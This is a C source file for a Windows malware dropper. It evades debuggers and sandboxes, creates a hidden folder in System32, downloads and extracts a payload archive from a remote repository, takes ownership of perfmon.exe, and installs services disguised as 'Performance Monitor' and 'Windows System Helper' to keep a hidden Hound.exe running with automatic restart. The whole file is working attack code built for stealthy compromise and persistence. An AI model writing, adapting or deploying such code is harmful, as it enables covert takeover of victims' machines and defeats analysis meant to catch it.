#include <windows.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

// Configuration
#define MAX_ATTEMPTS 3
#define EVASION_SEED 0xDEADBEEF

// Global state
static char g_mallDir[MAX_PATH] = {0};

// Anti-analysis
void AntiSandbox();
void AntiDebug();
void RandomSleep(DWORD base, DWORD variance);

// Payload handling
void DownloadAndExtractMallZip();
void InstallNSSM();
void SetupPerfmonService();
void RunHound();
void TakeOwnership(const char* path);
void AddToPath(const char* path);
void RunHiddenCommand(LPCSTR command);
void DownloadFile(const char* url, const char* savePath);

// Random generator
static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

// Anti-analysis implementations
void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
}

void AntiSandbox() {
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) < 900) ExitProcess(0);
    
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) ExitProcess(0);
}

void RandomSleep(DWORD base, DWORD variance) {
    DWORD sleepTime = base + (my_rand() % variance);
    Sleep(sleepTime);
}

void DownloadFile(const char* url, const char* savePath) {
    HRESULT hr = URLDownloadToFileA(NULL, url, savePath, 0, NULL);
}

void RunHiddenCommand(LPCSTR command) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdCopy[1024];
    lstrcpynA(cmdCopy, command, sizeof(cmdCopy));

    if (CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void TakeOwnership(const char* path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
             "takeown /f \"%s\" && icacls \"%s\" /grant \"%%USERNAME%%\":F",
             path, path);
    RunHiddenCommand(cmd);
}

void AddToPath(const char* path) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 
        0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        
        char currentPath[4096];
        DWORD size = sizeof(currentPath);
        
        if (RegQueryValueExA(hKey, "Path", NULL, NULL, (LPBYTE)currentPath, &size) == ERROR_SUCCESS) {
            if (strstr(currentPath, path) == NULL) {
                strcat(currentPath, ";");
                strcat(currentPath, path);
                RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ, (BYTE*)currentPath, strlen(currentPath)+1);
                
                // Broadcast environment change
                SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", 0, 1000, NULL);
            }
        }
        RegCloseKey(hKey);
    }
}

void CreateMallDirectory() {
    GetSystemDirectoryA(g_mallDir, MAX_PATH);
    PathAppendA(g_mallDir, "mall");
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryA(g_mallDir, NULL);
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

void DownloadAndExtractMallZip() {
    char zipPath[MAX_PATH];
    GetSystemDirectoryA(zipPath, MAX_PATH);
    PathAppendA(zipPath, "mall.zip");
    
    // Download
    DownloadFile("https://github.com/Drakovthe6th/TBuG/raw/master/mall.zip", zipPath);
    
    // Extract
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    // Cleanup
    DeleteFileA(zipPath);
}

void InstallNSSM() {
    char nssmPath[MAX_PATH];
    GetSystemDirectoryA(nssmPath, MAX_PATH);
    PathAppendA(nssmPath, "nssm.exe");
    
    if (GetFileAttributesA(nssmPath) != INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    // Download to temp
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    PathAppendA(tempPath, "nssm.exe");
    DownloadFile("https://nssm.cc/ci/nssm.exe", tempPath);
    
    // Install to Program Files
    char installPath[MAX_PATH] = "C:\\Program Files (x86)\\nssm\\nssm.exe";
    char installDir[MAX_PATH] = "C:\\Program Files (x86)\\nssm";
    
    CreateDirectoryA(installDir, NULL);
    CopyFileA(tempPath, installPath, FALSE);
    
    // Add to system path
    AddToPath(installDir);
    
    // Cleanup
    DeleteFileA(tempPath);
}

void SetupPerfmonService() {
    // Take ownership of original perfmon.exe
    char originalPerfmon[MAX_PATH];
    GetSystemDirectoryA(originalPerfmon, MAX_PATH);
    PathAppendA(originalPerfmon, "perfmon.exe");
    TakeOwnership(originalPerfmon);
    
    // Get our modified perfmon
    char perfmonPath[MAX_PATH];
    lstrcpyA(perfmonPath, g_mallDir);
    PathAppendA(perfmonPath, "perfmon.exe");
    
    char configPath[MAX_PATH];
    lstrcpyA(configPath, g_mallDir);
    PathAppendA(configPath, "perfmon.cfg");
    
    // Create service
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "nssm install \"Performance Monitor\" \"%s\" -c \"%s\"",
        perfmonPath,
        configPath
    );
    RunHiddenCommand(cmd);
    
    // Configure service
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Performance Monitor\" DisplayName \"Performance Monitor\""
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Performance Monitor\" Description \"Monitors system performance counters\""
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Performance Monitor\" Start SERVICE_AUTO_START"
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Performance Monitor\" AppStdout NUL"
    );
    RunHiddenCommand(cmd);
    
    // Start service
    snprintf(cmd, sizeof(cmd),
        "nssm start \"Performance Monitor\""
    );
    RunHiddenCommand(cmd);
    
    // Set persistence recovery
    snprintf(cmd, sizeof(cmd),
        "sc failure \"Performance Monitor\" actions= restart/60000/restart/60000 reset= 86400"
    );
    RunHiddenCommand(cmd);
}

void SetupHoundPersistence() {
    char houndPath[MAX_PATH];
    lstrcpyA(houndPath, g_mallDir);
    PathAppendA(houndPath, "Hound.exe");
    
    // Create service
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "nssm install \"Windows Hound Service\" \"%s\"",
        houndPath
    );
    RunHiddenCommand(cmd);
    
    // Configure service
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Windows Hound Service\" DisplayName \"Windows System Helper\""
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Windows Hound Service\" Description \"Provides system helper services\""
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "nssm set \"Windows Hound Service\" Start SERVICE_AUTO_START"
    );
    RunHiddenCommand(cmd);
    
    // Start service
    snprintf(cmd, sizeof(cmd),
        "nssm start \"Windows Hound Service\""
    );
    RunHiddenCommand(cmd);
}

void RunHound() {
    char houndPath[MAX_PATH];
    lstrcpyA(houndPath, g_mallDir);
    PathAppendA(houndPath, "Hound.exe");
    
    if (GetFileAttributesA(houndPath) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(houndPath, NULL, NULL, NULL, FALSE, 
                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AntiDebug();
    AntiSandbox();
    RandomSleep(3000, 2000);
    
    my_srand(GetTickCount());
    
    // Create mall directory in system32
    CreateMallDirectory();
    
    // Download and extract mall.zip
    DownloadAndExtractMallZip();
    
    // Install NSSM if needed
    InstallNSSM();
    
    // Take ownership and setup perfmon service
    SetupPerfmonService();
    
    // Setup and run Hound.exe
    SetupHoundPersistence();
    RunHound();
    
    // Stealthy exit
    return 0;
}